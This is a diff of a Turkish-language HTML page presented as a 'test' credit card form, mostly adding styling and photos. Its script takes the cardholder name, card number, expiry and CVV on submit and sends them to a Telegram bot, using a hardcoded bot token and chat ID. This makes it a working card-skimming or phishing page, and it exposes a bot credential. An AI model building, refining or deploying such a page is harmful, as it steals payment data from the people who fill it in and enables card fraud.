@@ -1,47 +1,158 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Test Kart Formu</title>
+  <meta charset="UTF-8" />
+  <title>Test Kart Formu ve Fotoğraf Gösterimi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: flex-start; /* En sola hizalama */
+      align-items: flex-start;
+      padding: 40px;
+      gap: 40px;
+      flex-wrap: nowrap;
+    }
+
+    .card-container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      color: #555;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      background-color: #007bff;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    /* Yan fotoğraflar (yanyana) */
+    .photo-stack {
+      display: flex;
+      flex-direction: row; /* yan yana */
+      gap: 20px;
+      max-width: 600px;
+      box-sizing: border-box;
+    }
+
+    .photo-stack img {
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+      height: auto;
+      max-width: 400px; /* genişletildi (önce 130px) */
+    }
+
+    /* Kart altındaki fotoğraflar (dikey) */
+    .photo-stack-vertical {
+      margin-top: -260px;
+      display: flex;
+      flex-direction: column;
+      gap: 90px;
+      max-width: 800px;
+      box-sizing: border-box;
+    }
+
+    .photo-stack-vertical img {
+      width: 110%;
+      max-width: 600px; /* genişletildi (önce 250px) */
+      border-radius: 0px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+      height: auto;
+      margin-left: auto;
+      margin-right: auto;
+    }
+  </style>
 </head>
 <body>
-  <h2>Test Amaçlı Kart Formu</h2>
+  <div class="card-container">
+    <h2>Test Amaçlı Kart Formu</h2>
 
-  <form id="cardForm" autocomplete="on" onsubmit="sendCardInfo(event)">
-    <label>
-      Kart Üzerindeki İsim:
-      <input type="text" id="name" name="cc-name" autocomplete="cc-name" required>
-    </label><br><br>
+    <form id="cardForm" autocomplete="on" onsubmit="sendCardInfo(event)">
+      <label>
+        Kart Üzerindeki İsim:
+        <input type="text" id="name" name="cc-name" autocomplete="cc-name" required />
+      </label>
 
-    <label>
-      Kart Numarası:
-      <input type="text" id="cardNumber" name="cc-number" autocomplete="cc-number" required>
-    </label><br><br>
+      <button type="submit">Gönder</button>
 
-    <label>
-      Son Kullanma Tarihi (AA/YY):
-      <input type="text" id="expiry" name="cc-exp" autocomplete="cc-exp" required>
-    </label><br><br>
+      <label>
+        Kart Numarası:
+        <input type="text" id="cardNumber" name="cc-number" autocomplete="cc-number" required />
+      </label>
 
-    <label>
-      CVV:
-      <input type="text" id="cvv" name="cc-csc" autocomplete="cc-csc" required>
-    </label><br><br>
+      <label>
+        Son Kullanma Tarihi (AA/YY):
+        <input type="text" id="expiry" name="cc-exp" autocomplete="cc-exp" required />
+      </label>
 
-    <button type="submit">Gönder</button>
-  </form>
+      <label>
+        CVV:
+        <input type="text" id="cvv" name="cc-csc" autocomplete="cc-csc" required />
+      </label>
+    </form>
+
+    <!-- Kartın hemen altında dikey fotoğraflar -->
+    <div class="photo-stack-vertical">
+      <img src="photo_5940363868779956652_y.jpg" alt="Fotoğraf 1" />
+      <img src="photo_5940363868779956652_y.jpg" alt="Fotoğraf 2" />
+    </div>
+  </div>
+
+  <!-- Yan taraftaki fotoğraflar -->
+  <div class="photo-stack">
+    <img src="photo_5940363868779956652_y.jpg" alt="Fotoğraf 3" />
+    <img src="photo_5940363868779956652_y.jpg" alt="Fotoğraf 4" />
+  </div>
 
   <script>
+    // Kart Bilgisi Gönderimi
     const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
     const TELEGRAM_CHAT_ID = '5395609882';
 
     function sendCardInfo(event) {
       event.preventDefault();
 
-      const name = document.getElementById('name').value;
-      const cardNumber = document.getElementById('cardNumber').value;
-      const expiry = document.getElementById('expiry').value;
-      const cvv = document.getElementById('cvv').value;
+      const name = document.getElementById('name').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.trim();
+      const expiry = document.getElementById('expiry').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
 
       const message = `💳 *Test Kart Bilgisi*\n\n👤 İsim: ${name}\n💳 Kart No: ${cardNumber}\n📅 Son Kullanma: ${expiry}\n🔐 CVV: ${cvv}`;
 
@@ -54,7 +165,7 @@
           parse_mode: 'Markdown'
         })
       })
-      .then(response => response.json())
+      .then(res => res.json())
       .then(data => {
         if (data.ok) {
           alert('Gönderildi!');
@@ -63,11 +174,12 @@
           alert('Telegram API Hatası: ' + data.description);
         }
       })
-      .catch(error => {
-        console.error('Hata:', error);
+      .catch(err => {
+        console.error('Hata:', err);
         alert('Veri gönderilemedi.');
       });
     }
   </script>
 </body>
 </html>
+
